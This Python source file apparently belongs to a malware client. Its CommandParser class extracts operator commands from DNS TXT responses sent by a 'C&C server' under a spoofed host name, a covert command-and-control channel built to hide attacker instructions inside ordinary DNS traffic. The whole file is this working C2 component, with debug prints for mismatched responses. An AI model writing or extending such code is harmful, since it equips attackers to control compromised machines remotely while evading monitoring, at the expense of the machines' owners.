from utils.consts import CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS

class CommandParser:
    """ A class to help parse DNS responses for commands. """
    def __init__(self):
        pass

    def parse(self, response):
        """ Extract the command from a DNS response sent by the C&C server. """ 
        if not response.haslayer('DNS'):
            return None

        print(response.show())
        an = response['DNS'].an
        if an == None:
            print("[Sniffer] No answer found for response.")
            return None

        if an.type != PACKET_OPTIONS['DNS']['AN']['TYPE']:
            print("[Sniffer] Response not of type 'TXT'.")
            return None

        if an.rrname != CC_SERVER_SPOOFED_HOST + ".":
            print("[Sniffer] Spoofed host not matching.")
            return None

        if isinstance(an.rdata, list):
            return "".join(an.rdata)

        return an.rdata